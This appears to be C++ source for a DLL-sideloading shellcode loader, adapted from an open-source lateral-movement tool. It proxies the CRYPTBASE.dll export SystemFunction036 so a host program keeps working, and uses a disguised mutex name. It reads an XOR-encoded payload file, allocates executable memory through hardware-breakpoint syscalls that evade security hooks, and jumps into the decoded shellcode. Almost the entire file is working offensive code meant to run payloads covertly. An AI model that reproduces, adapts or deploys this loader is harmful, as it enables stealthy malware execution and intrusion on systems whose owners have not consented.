/*
    Credit to icyguider - https://github.com/icyguider/LatLoader/blob/main/src/sideloader.c
    Modified by choi 
        - added mutex since disksnapshot was loading DLL + executing proxy function multiple times 
*/
#include <iostream>
#include "HWSyscalls.h"

typedef NTSTATUS(NTAPI *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

unsigned char* decoded;

int decode(unsigned char *encoded, unsigned char key[], int keylen, int long size)
{
    decoded = (unsigned char*)malloc(size);
    for (int i = 0; i < size; i++)
    {
        decoded[i] = encoded[i] ^ key[i % keylen];
    }
    return 0;
}

int hittem()
{
    if (!InitHWSyscalls())
        return;

    const char* fileName = "{{FILENAME}}";

    // Open file, get size of shellcode 
    FILE* file = fopen(fileName, "rb");
    if (file == NULL) return 1;
    fseek(file, 0, SEEK_END);
    SIZE_T size = ftell(file);
    fclose(file);

    // Allocate memory 
    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char*)"NtAllocateVirtualMemory");
    if (!pNtAllocateVirtualMemory) {
        return -2;
    }
    NTSTATUS status = 0;
    PVOID base_addr = NULL;
    status = pNtAllocateVirtualMemory(GetCurrentProcess(), &base_addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Allocate memory according to size, and read contents of file into shellcodefer
    file = fopen(fileName, "rb");
    unsigned char * shellcode = (unsigned char *) malloc(size);
    int bytes_read = fread(shellcode, sizeof(unsigned char), size, file);
    fclose(file);
    
    // XOR decode
    char key[] = "{{KEY}}";
    decode(shellcode, key, strlen(key), size);

    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE); 
    DWORD mode = 0;
    GetConsoleMode(hStdin, &mode);
    SetConsoleMode(hStdin, mode & (~ENABLE_ECHO_INPUT));

    // Write decoded shellcode to allocated memory
    memcpy(base_addr, decoded, size);
    free(decoded);

    DeinitHWSyscalls();

    // Execute with function pointer 
    ((void(*)())base_addr)();

    return 0;
}

typedef BOOL(*SystemFunction036_Type)(void* buffer, ULONG len);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


extern "C" __declspec(dllexport) DWORD SystemFunction036_Proxy(void* buffer, ULONG len)
{

    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\SQLServerRecCompleteEx");
    if (hMutex == NULL) {
        // Handle error, maybe someday 
    } else {
        if (GetLastError() != ERROR_ALREADY_EXISTS) {
            hittem();
        }
        CloseHandle(hMutex);
    }

    // Load original DLL and get function pointer
    SystemFunction036_Type Original_SystemFunction036 = (SystemFunction036_Type)GetProcAddress(LoadLibrary("C:\\Windows\\System32\\CRYPTBASE.dll"), "SystemFunction036");
    BOOL result = Original_SystemFunction036(buffer, len);
    return result;
}